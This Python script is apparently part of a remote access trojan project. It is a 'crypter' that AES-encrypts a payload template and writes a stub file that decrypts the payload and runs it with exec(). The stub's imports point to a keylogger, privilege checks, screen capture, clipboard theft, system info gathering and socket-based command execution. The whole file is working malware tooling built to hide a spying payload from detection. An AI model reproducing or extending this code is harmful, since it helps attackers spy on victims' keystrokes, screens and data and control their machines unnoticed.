import os
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from template import *
from Crypto.Random import get_random_bytes



def crypter():
    key = get_random_bytes(32)
    iv = os.urandom(16)


    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(template.encode("utf-8"), AES.block_size)
    encrypted = base64.b64encode(cipher.encrypt(padded))

    with open("encrypted.py", "w") as f:
        f.write(f"""
import socket
from json import dumps, loads
from subprocess import PIPE, Popen, TimeoutExpired
import ctypes
import os
import keylogger
from threading import Thread
from base64 import b64encode, b64decode
from time import sleep
from elevated import elevatedcheck
from getinfo import *
from config import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad ,unpad
from cryptography.fernet import Fernet
from PIL import ImageGrab, Image
from io import BytesIO
import win32clipboard


encrypted = {encrypted}
cipher = AES.new({key}, AES.MODE_CBC, {iv})
message = cipher.decrypt(b64decode(encrypted))
unpadded = unpad(message, AES.block_size)
exec(unpadded)
        """)
        f.close()

crypter()
